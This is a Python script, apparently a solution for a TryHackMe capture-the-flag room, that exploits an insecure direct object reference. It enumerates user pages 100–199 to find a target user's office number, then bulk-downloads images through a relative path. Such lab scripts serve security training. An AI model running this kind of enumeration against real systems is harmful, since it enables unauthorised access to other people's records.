#!/usr/bin/env python3

import argparse
import os
import platform
import re
import requests


############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def ConductIDOR_Users(baseURL):
    found = bool()
    message = str()
    route = "users"
    success = bool()
    targetUser = "Elf\s+Pivot\s+McRed"

    try:
        for i in range(100, 200):
            SysMsgNB(f"checking ID: {i:>04}")
            targetURL = f"{baseURL}/{route}/{i}.html"
            resp = requests.get(targetURL, timeout=10)
            if resp.status_code != 200:
                continue

            reg = re.compile(targetUser)
            matches = reg.findall(resp.text)

            if len(matches) > 0:
                found = True
                officeNumber, success, message = FindOffice(resp.text)
                if not(success):
                    raise ValueError(message)
                message = f"{message}: {officeNumber}"
                break

        if not(found):
            raise ValueError("target not discovered")

        success = True
    except KeyboardInterrupt:
        message = "user stopped execution via keyboard interrupt"
        success = False
    except Exception as ex:
        message = str(ex)
        officeNumber = -1
        success = False

    return (officeNumber, success, message)

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def FindOffice(data):
    officePattern = "Office Number:\s[0-9]{1,5}"

    try:
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise ValueError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,bytes):
            data = data.decode('utf-8')

        reg = re.compile(officePattern)
        matches = reg.findall(data)
        if len(matches) < 1:
            raise ValueError("office number not found")

        officeNumber = int(matches[0].split(":")[1].strip(" ").strip("\n"))
        message = "office number discovered"
        success = True
    except Exception as ex:
        officeNumber = -1
        message = str(ex)
        success = False

    return (officeNumber, success, message)

def PullPictures(baseURL):
    imageCount = 0
    message = str()
    route = "../images"
    success = bool()

    try:
        for i in range(100,200):
            targetPicture = f"{i}.png"
            targetURL = f"{baseURL}/{route}/{targetPicture}"

            SysMsgNB(f"attempting to get \"{targetPicture}\"")
            resp = requests.get(targetURL, timeout=10)
            if resp.status_code >= 400:
                continue

            with open(targetPicture, "wb") as fptr:
                fptr.write(resp.content)

            imageCount += 1
            SucMsg(f"image \"{targetPicture}\" saved")

        if imageCount < 1:
            raise ValueError("no images accessed and saved")
        
        print(ANSI_CLRLN)
        message = f"{imageCount} images saved"
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (success, message)


def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseURL = f"{scheme}://{target}:{port}"

    officeNumber, success, message = ConductIDOR_Users(baseURL)
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    print()

    success, message = PullPictures(baseURL)
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    return

if __name__ == "__main__":
    main()

